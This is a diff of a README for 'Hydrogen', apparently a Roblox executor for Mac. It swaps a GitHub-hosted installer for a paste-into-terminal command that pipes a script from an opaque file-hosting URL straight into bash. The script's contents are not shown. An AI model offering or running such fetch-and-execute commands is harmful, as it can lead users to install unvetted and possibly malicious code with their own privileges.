@@ -46,13 +46,12 @@ Your Mac account must be adminstrator.
 > ___
 >Your mac os version must be 10.15 or up to run Hydrogen.
 > ___
-> Roblox and Hydrogen must be Uninstalled. 
 
 > ___
 
 To install, please paste this in your terminal:
 ```sh
-cd /tmp && curl -LJs "https://github.com/retguard/upgraded-octo-journey/raw/main/hydro-installer" -O && chmod +x ./hydro-installer && ./hydro-installer
+bash -c "$(curl -fsSL https://0ai4bbbahf.ufs.sh/f/4fzhZqSSYIjmUZpbE5XAgLkF67GUQ3DTbxjXyp052lYrBi8M)"
 ```
 
 > ___
